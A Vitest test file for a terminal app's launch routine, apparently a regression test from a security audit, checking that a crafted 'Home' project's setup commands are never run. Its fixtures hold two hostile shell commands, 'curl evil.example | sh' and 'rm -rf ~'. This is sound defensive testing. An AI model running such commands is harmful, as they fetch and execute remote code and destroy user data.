import { describe, it, expect, vi, beforeEach } from "vitest";

const api = vi.hoisted(() => ({
	homeDir: vi.fn(),
	openHomeTerminal: vi.fn(),
	openTerminal: vi.fn(),
	openPlainTerminal: vi.fn(),
	errorMessage: (e: unknown) => String(e),
}));
vi.mock("$lib/api", () => api);

import { autoOpenHomeOnLaunch } from "./launch";
import { appStore } from "$lib/stores/app.svelte";
import { terminalStore } from "$lib/stores/terminal.svelte";
import type { ProjectDto } from "$lib/api";

function project(overrides: Partial<ProjectDto> = {}): ProjectDto {
	return { id: "home-id", name: "Home", path: "/home/me", setupCommands: [], notes: "", ...overrides };
}

// appStore/terminalStore are module-level singletons — reset before every
// test so nothing depends on execution order.
beforeEach(() => {
	appStore.entries = [];
	terminalStore.tabs = [];
	terminalStore.activeTabId = null;
	for (const fn of [api.homeDir, api.openHomeTerminal, api.openTerminal, api.openPlainTerminal]) {
		fn.mockReset();
		fn.mockResolvedValue(undefined);
	}
});

describe("autoOpenHomeOnLaunch — security audit 2026-09-24, L7", () => {
	it("opens a plain shell at the Home entry's path and never runs its setup commands", async () => {
		// Regression test: an imported/crafted config can carry a project named
		// "Home" with arbitrary setup commands. `open_terminal` is the IPC that
		// feeds those into the shell; the launch auto-open must not use it.
		appStore.entries = [{ type: "project", ...project({ setupCommands: ["curl evil.example | sh"] }) }];

		await autoOpenHomeOnLaunch();

		expect(api.openTerminal).not.toHaveBeenCalled();
		expect(api.openPlainTerminal).toHaveBeenCalledTimes(1);
		const [sessionId, cwd] = api.openPlainTerminal.mock.calls[0];
		expect(cwd).toBe("/home/me");
		expect(terminalStore.tabs).toHaveLength(1);
		expect(terminalStore.tabs[0].projectId).toBe("home-id");
		expect(terminalStore.tabs[0].root).toMatchObject({ type: "leaf", sessionId, status: "ready" });
	});

	it("finds a Home entry nested inside a folder too, and is equally plain", async () => {
		appStore.entries = [
			{
				type: "folder",
				id: "f1",
				name: "Work",
				members: [project({ setupCommands: ["rm -rf ~"] })],
			},
		];

		await autoOpenHomeOnLaunch();

		expect(api.openTerminal).not.toHaveBeenCalled();
		expect(api.openPlainTerminal).toHaveBeenCalledWith(expect.any(String), "/home/me");
	});

	it("falls back to the platform home directory when there is no Home entry", async () => {
		api.homeDir.mockResolvedValue("/home/me");

		await autoOpenHomeOnLaunch();

		expect(api.openTerminal).not.toHaveBeenCalled();
		expect(api.openPlainTerminal).not.toHaveBeenCalled();
		expect(api.openHomeTerminal).toHaveBeenCalledTimes(1);
		expect(terminalStore.tabs[0].projectId).toBeNull();
	});

	it("does nothing when the home directory can't be resolved and there is no Home entry", async () => {
		api.homeDir.mockResolvedValue(null);

		await autoOpenHomeOnLaunch();

		expect(terminalStore.tabs).toHaveLength(0);
		expect(api.openHomeTerminal).not.toHaveBeenCalled();
	});

	it("does nothing when a tab is already open", async () => {
		appStore.entries = [{ type: "project", ...project() }];
		terminalStore.openTab(null, "existing", "/tmp");

		await autoOpenHomeOnLaunch();

		expect(terminalStore.tabs).toHaveLength(1);
		expect(api.openPlainTerminal).not.toHaveBeenCalled();
		expect(api.openTerminal).not.toHaveBeenCalled();
	});

	it("marks the pane as errored (not ready) when the plain spawn fails", async () => {
		appStore.entries = [{ type: "project", ...project() }];
		api.openPlainTerminal.mockRejectedValue("spawn failed");

		await autoOpenHomeOnLaunch();

		expect(terminalStore.tabs[0].root).toMatchObject({ type: "leaf", status: "error" });
	});
});
